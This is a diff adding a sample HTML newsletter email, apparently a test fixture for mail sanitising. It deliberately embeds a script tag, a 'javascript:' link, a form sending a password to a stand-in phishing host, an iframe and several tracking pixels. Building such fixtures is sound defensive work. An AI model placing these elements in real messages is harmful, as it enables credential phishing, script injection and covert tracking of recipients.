@@ -1,0 +1,37 @@
+From: Example Product News <newsletter@news.example.net>
+To: erika@example.org
+Subject: Product news in September
+Date: Wed, 02 Sep 2026 06:00:00 +0000
+Message-ID: <nl-2026-09@news.example.net>
+List-Unsubscribe: <https://news.example.net/unsubscribe?u=abc>, <mailto:unsubscribe@news.example.net>
+List-Unsubscribe-Post: List-Unsubscribe=One-Click
+List-Id: Example Product News <news.example.net>
+Precedence: bulk
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE html><html><head><title>Newsletter</title>
+<style>body{background:url(https://tracker.example.net/bg.png)}</style>
+<script>document.write('tracking')</script></head>
+<body>
+<table width=3D"600" cellpadding=3D"0" cellspacing=3D"0" border=3D"0"><tr><=
+td style=3D"color:#333;position:fixed;background-image:url(https://tracker.=
+example.net/x.png)">
+<h1>Product news in September</h1>
+<img src=3D"https://cdn.example.net/banner.jpg" alt=3D"Banner" width=3D"600=
+">
+<p>Our new release brings faster search, a refreshed settings page and many=
+ small
+improvements. Read the full release notes on our website.</p>
+<p><a href=3D"https://news.example.net/release?utm_source=3Dnewsletter" onc=
+lick=3D"track()">Read more</a></p>
+<p><a href=3D"javascript:alert('x')">Do not click</a></p>
+<form action=3D"https://phish.example.net/login"><input name=3D"password"><=
+/form>
+<iframe src=3D"https://ads.example.net/frame"></iframe>
+</td></tr></table>
+<img src=3D"https://tracker.example.net/open.gif?id=3D12345" width=3D"1" he=
+ight=3D"1">
+</body></html>
+
